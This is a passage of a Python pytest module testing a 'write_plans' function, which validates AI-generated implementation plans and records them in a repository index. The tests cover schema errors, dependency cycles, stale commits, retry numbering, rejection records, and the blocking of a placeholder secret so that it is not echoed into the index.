        (lambda plan: plan["why_this_matters"].update(problem=""), "SCHEMA_INVALID"),
        (lambda plan: plan.update(current_state_excerpts=[]), "SCHEMA_INVALID"),
        (
            lambda plan: plan["current_state_excerpts"][0]["line_anchor"].update(
                end_line=200
            ),
            "EXCERPT_ANCHOR_INVALID",
        ),
        (
            lambda plan: plan["steps"][0].pop("verification"),
            "SCHEMA_INVALID",
        ),
        (
            lambda plan: plan["test_plan"].update(cases=[]),
            "SCHEMA_INVALID",
        ),
    ],
)
def test_incomplete_typed_result_is_blocked_without_plan_file(
    tmp_path: Path,
    mutate: Any,
    expected_code: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    mutate(plan)

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
    )

    assert result["written"] == []
    assert len(result["failed"]) == 1
    assert not list((repo / "daydream_plans").glob("[0-9][0-9][0-9]-*.md"))
    index = (repo / "daydream_plans/README.md").read_text()
    assert f"BLOCKED (PLAN_VALIDATION_FAILED: {expected_code}" in index


@pytest.mark.parametrize(
    "model_excerpt",
    [
        pytest.param("return [load_item(item_id)", id="model-text-is-not-canonical"),
        pytest.param(None, id="model-text-is-optional"),
        pytest.param(42, id="model-text-has-non-string-shape"),
    ],
)
def test_plan_current_state_uses_locator_and_persists_host_excerpt(
    tmp_path: Path,
    model_excerpt: object,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    excerpt = plan["current_state_excerpts"][0]
    if model_excerpt is None:
        excerpt.pop("verbatim_excerpt")
    else:
        excerpt["verbatim_excerpt"] = model_excerpt
    raw_plan = deepcopy(plan)

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert plan == raw_plan
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert (
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]"
    ) in text
    assert "shape is irrelevant" not in text


def test_legacy_markdown_output_fails_closed_without_echoing_content(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    legacy = {
        "slug": "legacy-plan",
        "title": "Legacy plan that includes TOKEN=super-secret-value",
        "priority": "P1",
        "depends_on": [],
        "markdown": "## Steps\n\nTOKEN=super-secret-value",
    }

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **legacy}],
        planned_at=sha,
    )

    assert result["written"] == []
    index = (repo / "daydream_plans/README.md").read_text()
    assert "BLOCKED (PLAN_VALIDATION_FAILED: LEGACY_MARKDOWN_OUTPUT" in index
    assert "super-secret-value" not in index


def test_mixed_batch_writes_valid_sibling_and_blocks_invalid_sibling(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    invalid = _typed_plan(slug="invalid-catalog-plan")
    invalid["test_plan"]["cases"] = []

    result = write_plans(
        repo / "daydream_plans",
        [
            _selection(),
            _selection(plan=invalid, fingerprint="fp-invalid"),
        ],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert len(result["failed"]) == 1
    assert [path.name for path in (repo / "daydream_plans").glob("0*.md")] == [
        "001-batch-catalog-queries.md"
    ]
    index = (repo / "daydream_plans/README.md").read_text()
    assert "| TODO |" in index
    assert "BLOCKED (PLAN_VALIDATION_FAILED: SCHEMA_INVALID" in index


def test_planned_at_from_an_unrelated_root_is_rejected(tmp_path: Path) -> None:
    repo, original_root = _repo(tmp_path)
    tree = _git(repo, "rev-parse", "HEAD^{tree}")
    unrelated_root = _git(
        repo,
        "commit-tree",
        tree,
        "-m",
        "unrelated root with the same tree",
    )
    _git(repo, "checkout", "--detach", unrelated_root)

    result = write_plans(
        repo / "daydream_plans",
        [_selection()],
        planned_at=original_root,
    )

    assert result["written"] == []
    assert "PLANNED_AT_NOT_ANCESTOR" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_head_change_after_planning_blocks_stale_todo(tmp_path: Path) -> None:
    repo, planned_at = _repo(tmp_path)
    (repo / "README.md").write_text(
        "# Catalog service\n\nConcurrent branch update.\n",
        encoding="utf-8",
    )
    _git(repo, "add", "README.md")
    _git(repo, "commit", "-m", "advance head after plan fan-out")

    result = write_plans(
        repo / "daydream_plans",
        [_selection()],
        planned_at=planned_at,
    )

    assert result["written"] == []
    assert not list((repo / "daydream_plans").glob("[0-9][0-9][0-9]-*.md"))
    assert "PLAN_HEAD_CHANGED" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_dependency_cycle_blocks_every_member(tmp_path: Path) -> None:
    repo, sha = _repo(tmp_path)
    first = _typed_plan(slug="catalog-foundation")
    second = _typed_plan(slug="catalog-consumer")
    first["dependencies"] = [
        {
            "slug": "catalog-consumer",
            "reason": "The foundation assumes the consumer contract is established.",
        }
    ]
    second["dependencies"] = [
        {
            "slug": "catalog-foundation",
            "reason": "The consumer must follow the established foundation contract.",
        }
    ]

    result = write_plans(
        repo / "daydream_plans",
        [
            _selection(plan=first, fingerprint="fp-foundation"),
            _selection(plan=second, fingerprint="fp-consumer"),
        ],
        planned_at=sha,
    )

    assert result["written"] == []
    assert len(result["failed"]) == 2
    assert (repo / "daydream_plans/README.md").read_text().count(
        "DEPENDENCY_CYCLE"
    ) == 2


def test_dependency_precedes_consumer_and_reason_is_rendered(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    foundation = _typed_plan(slug="catalog-foundation")
    consumer = _typed_plan(slug="catalog-consumer")
    consumer["dependencies"] = [
        {
            "slug": "catalog-foundation",
            "reason": "The consumer must follow the established foundation contract.",
        }
    ]

    result = write_plans(
        repo / "daydream_plans",
        [
            _selection(plan=consumer, fingerprint="fp-consumer"),
            _selection(plan=foundation, fingerprint="fp-foundation"),
        ],
        planned_at=sha,
    )

    assert [entry["slug"] for entry in result["written"]] == [
        "catalog-foundation",
        "catalog-consumer",
    ]
    assert [path.name for path in (repo / "daydream_plans").glob("0*.md")] == [
        "001-catalog-foundation.md",
        "002-catalog-consumer.md",
    ]
    index = (repo / "daydream_plans/README.md").read_text()
    assert (
        "002 depends on catalog-foundation because The consumer must follow "
        "the established foundation contract."
    ) in index


def test_dependency_reason_survives_later_unrelated_append(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    foundation = _typed_plan(slug="catalog-foundation")
    consumer = _typed_plan(slug="catalog-consumer")
    reason = "The consumer must follow the established foundation contract."
    consumer["dependencies"] = [
        {
            "slug": "catalog-foundation",
            "reason": reason,
        }
    ]
    write_plans(
        repo / "daydream_plans",
        [
            _selection(plan=consumer, fingerprint="fp-consumer"),
            _selection(plan=foundation, fingerprint="fp-foundation"),
        ],
        planned_at=sha,
    )

    unrelated = _typed_plan(slug="catalog-observability")
    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=unrelated, fingerprint="fp-observability")],
        planned_at=sha,
    )

    assert [entry["number"] for entry in result["written"]] == [3]
    index = (repo / "daydream_plans/README.md").read_text()
    assert index.count(f"002 depends on catalog-foundation because {reason}") == 1
    assert "| catalog-foundation | TODO |" in index


@pytest.mark.parametrize(
    "status",
    [
        "TODO",
        "IN PROGRESS",
        "DONE",
        "BLOCKED (tests failed after three executor attempts)",
    ],
)
def test_valid_linked_plan_is_preserved_for_every_executor_status(
    tmp_path: Path,
    status: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    selection = _selection()
    write_plans(plans_dir, [selection], planned_at=sha)
    index_path = plans_dir / "README.md"
    index_path.write_text(
        index_path.read_text().replace("| TODO |", f"| {status} |"),
        encoding="utf-8",
    )

    result = write_plans(plans_dir, [selection], planned_at=sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert planned_fingerprints(plans_dir) == {"fp-fix-n-plus-one"}
    assert [path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")] == [
        "001-batch-catalog-queries.md"
    ]
    index = index_path.read_text()
    assert index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert f"| {status} |" in index


@pytest.mark.parametrize("failure_kind", ["transport", "validation"])
def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(
    tmp_path: Path,
    failure_kind: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    if failure_kind == "transport":
        failed_selection = {
            "finding": _finding(),
            "_attempt": {
                "transport_error_code": "NO_STRUCTURED_OBJECT",
                "received_result": None,
            },
            "error": True,
        }
    else:
        invalid = _typed_plan()
        invalid["test_plan"]["cases"] = []
        failed_selection = _selection(plan=invalid)

    failed = write_plans(plans_dir, [failed_selection], planned_at=sha)
    failed_index = (plans_dir / "README.md").read_text()
    expected_failure_status = (
        "PLAN_WRITER_FAILED"
        if failure_kind == "transport"
        else "PLAN_VALIDATION_FAILED"
    )
    assert expected_failure_status in failed_index
    assert failed_index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert planned_fingerprints(plans_dir) == set()
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))

    retried = write_plans(plans_dir, [_selection()], planned_at=sha)
    unrelated = write_plans(
        plans_dir,
        [
            _selection(
                plan=_typed_plan(slug="catalog-observability"),
                fingerprint="fp-observability",
            )
        ],
        planned_at=sha,
    )

    assert failed["written"] == []
    assert [entry["number"] for entry in retried["written"]] == [1]
    assert [entry["number"] for entry in unrelated["written"]] == [2]
    assert sorted(
        path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
    ) == [
        "001-batch-catalog-queries.md",
        "002-catalog-observability.md",
    ]
    index = (plans_dir / "README.md").read_text()
    assert index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert "PLAN_WRITER_FAILED" not in index
    assert "PLAN_VALIDATION_FAILED" not in index


def test_rejected_index_status_is_preserved_and_not_retried(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    plans_dir.mkdir()
    index_path = plans_dir / "README.md"
    rejected_row = (
        "| 001 <!-- fingerprint:fp-fix-n-plus-one --> | "
        "Fix N+1 catalog queries | P2 | M | — | "
        "REJECTED (superseded by repository evidence) |"
    )
    index_path.write_text(
        "# Implementation Plans\n\n"
        "## Execution order & status\n\n"
        "| Plan | Title | Priority | Effort | Depends on | Status |\n"
        "|------|-------|----------|--------|------------|--------|\n"
        f"{rejected_row}\n",
        encoding="utf-8",
    )

    result = write_plans(plans_dir, [_selection()], planned_at=sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert index_path.read_text().count(rejected_row) == 1
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))


def test_attempt_diagnostics_distinguish_failure_stages_and_success(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    schema_invalid = _typed_plan(slug="schema-invalid-plan")
    schema_invalid["why_this_matters"]["problem"] = ""
    dependency_invalid = _typed_plan(slug="dependency-invalid-plan")
    dependency_invalid["dependencies"] = [
        {
            "slug": "missing-foundation",
            "reason": "The implementation requires a foundation that is not available.",
        }
    ]

    selections = [
        {
            "finding": _finding(fingerprint="fp-transport"),
            "_attempt": {
                "descriptor": "plan-transport",
                "backend": "FakeBackend",
                "model": "fake-model",
                "received_result": None,
                "transport_error_code": "NO_STRUCTURED_OBJECT",
            },
            "error": True,
        },
        _selection(
            plan=schema_invalid,
            fingerprint="fp-schema",
        ),
        _selection(
            plan=dependency_invalid,
            fingerprint="fp-dependency",
        ),
        _selection(
            plan=deepcopy(_typed_plan(slug="successful-plan")),
            fingerprint="fp-success",
        ),
    ]

    result = write_plans(
        repo / "daydream_plans",
        selections,
        planned_at=sha,
    )

    diagnostics = {
        attempt["finding"]["fingerprint"]: attempt
        for attempt in result["diagnostics"]
    }
    assert {
        fingerprint: (attempt["stage"], attempt["disposition"])
        for fingerprint, attempt in diagnostics.items()
    } == {
        "fp-transport": ("transport", "blocked"),
        "fp-schema": ("schema", "blocked"),
        "fp-dependency": ("dependency", "blocked"),
        "fp-success": ("success", "success"),
    }
    assert diagnostics["fp-transport"]["validation_errors"] == [
        {"code": "NO_STRUCTURED_OBJECT", "pointer": "/"}
    ]
    assert diagnostics["fp-schema"]["validation_errors"] == [
        {"code": "SCHEMA_INVALID", "pointer": "/why_this_matters/problem"}
    ]
    assert diagnostics["fp-dependency"]["validation_errors"] == [
        {"code": "DEPENDENCY_UNKNOWN", "pointer": "/dependencies"}
    ]
    assert diagnostics["fp-success"]["artifact"]["path"].endswith(
        "-successful-plan.md"
    )
def test_load_rejections_returns_empty_for_absent_or_malformed_file(
    tmp_path: Path,
) -> None:
    plans_dir = tmp_path / "daydream_plans"
    assert load_rejections(plans_dir) == {}

    plans_dir.mkdir()
    (plans_dir / "rejected.json").write_text("{not json")
    assert load_rejections(plans_dir) == {}


def test_record_rejections_appends_and_loads_by_fingerprint(
    tmp_path: Path,
) -> None:
    plans_dir = tmp_path / "daydream_plans"
    first = {
        "fingerprint": "abc",
        "title": "Phantom N+1",
        "path": "apps/catalog/api.py",
        "reason": "No query loop exists.",
        "rejected_at_sha": "123",
    }
    second = {
        "fingerprint": "def",
        "title": "By-design behavior",
        "path": "apps/billing/api.py",
        "reason": "Documented behavior.",
        "rejected_at_sha": "456",
    }

    record_rejections(plans_dir, [first])
    record_rejections(plans_dir, [second])

    assert load_rejections(plans_dir) == {"abc": first, "def": second}
    envelope = json.loads((plans_dir / "rejected.json").read_text())
    assert envelope == {
        "schema_version": 1,
        "rejected": [first, second],
    }
